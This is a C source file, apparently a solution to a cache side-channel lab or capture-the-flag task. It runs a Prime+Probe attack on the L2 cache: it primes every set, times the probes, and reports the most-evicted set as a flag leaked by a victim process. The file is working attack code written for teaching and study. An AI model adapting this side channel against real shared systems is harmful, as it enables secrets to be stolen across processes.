#include "util.h"
// mman library to be used for hugepage allocations (e.g. mmap or posix_memalign only)
#include <sys/mman.h>

#define BUFF_SIZE (1 << 21)
#define LINE_SIZE 64
#define L2_SIZE 1048576
#define L2_WAYS 16
#define L2_NUM_SETS 1024
#define NUM_SAMPLES 500

int main(int argc, char const *argv[]) {
    char *buf = mmap(NULL, BUFF_SIZE,
        PROT_READ | PROT_WRITE,
        MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB,
        -1, 0);

    if (buf == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    // load table
    for (int i = 0; i < BUFF_SIZE; i += 4096) {
        buf[i] = 0;
    }

    volatile char tmp = 0;
    int scores[L2_NUM_SETS] = {0};

    // PRIME step! (im so tired)
    for (int pass = 0; pass < NUM_SAMPLES; pass++) {
        for (int way = 0; way < L2_WAYS; way++) {
            for (int set = 0; set < L2_NUM_SETS; set++) {
                tmp = buf[set * LINE_SIZE + way * L2_NUM_SETS * LINE_SIZE];
            }
        }

        // WAIT for activity..
        for (volatile int i = 0; i < 10000; i++) {
        }

        // PROBE cache and steal info (yoink)
        for (int set = 0; set < L2_NUM_SETS; set++) { // for each set
            int total = 0;
            for (int way = 0; way < L2_WAYS; way++) { // calculate latency for each way
                total += measure_one_block_access_time(
                    (uint64_t)&buf[set * LINE_SIZE + way * L2_NUM_SETS * LINE_SIZE]);
            }
            scores[set] += total;
        }
    }

    int flag = 0;
    int slowest_score = scores[0];

    // flag is wherever cache access takes the longest (victim evicted primed data from cache)
    for (int set = 1; set < L2_NUM_SETS; set++) {
        if (scores[set] > slowest_score) {
            slowest_score = scores[set];
            flag = set;
        }
    }

    printf("Flag: %d\n", flag);
    (void)tmp;
    return 0;
}
